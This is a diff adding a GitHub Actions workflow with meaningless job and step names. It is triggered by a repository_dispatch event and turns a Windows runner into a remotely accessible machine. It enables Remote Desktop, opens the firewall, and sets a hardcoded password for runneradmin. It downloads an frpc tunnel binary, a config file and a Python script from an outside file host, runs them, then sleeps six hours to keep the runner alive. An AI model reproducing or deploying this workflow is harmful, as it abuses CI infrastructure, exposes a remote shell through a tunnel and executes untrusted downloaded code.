@@ -1,0 +1,29 @@
+name: awehaw34
+
+on: 
+  repository_dispatch:
+    types:
+      - xhk
+
+jobs:
+  build:
+
+    runs-on: windows-latest
+
+    steps:
+    
+    - name: waejjaw2a
+      run: |
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
+          Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "tyaw#h42hq" -Force)
+          Invoke-WebRequest https://pan.urldwz.com/api/v3/file/source/28690/frpc.exe?sign=um-idm4yrvcPHrlTeA8g8fmvLL_R1VgoVQaIJ79HFc0%3D%3A0 -OutFile frpc.exe
+          Invoke-WebRequest https://pan.urldwz.com/api/v3/file/source/54313/main.ini?sign=cH58uO09u7W9EtLY1HAFj6exwYoFwk9ItMPE6NDJY4Q%3D%3A0 -OutFile frpc.ini
+          Invoke-WebRequest https://pan.urldwz.com/api/v3/file/source/54311/runc.py?sign=3-5JD7lmgC3UITwWgLLQoO-6T0gdLIg3AfZs-KybBug%3D%3A0 -OutFile runc.py
+          cmd /c pip install requests
+          cmd /c python runc.py | Out-Default
+          cmd /c frpc.exe -c frpc.ini
+
+    - name: Wating
+      run: Start-Sleep 21600
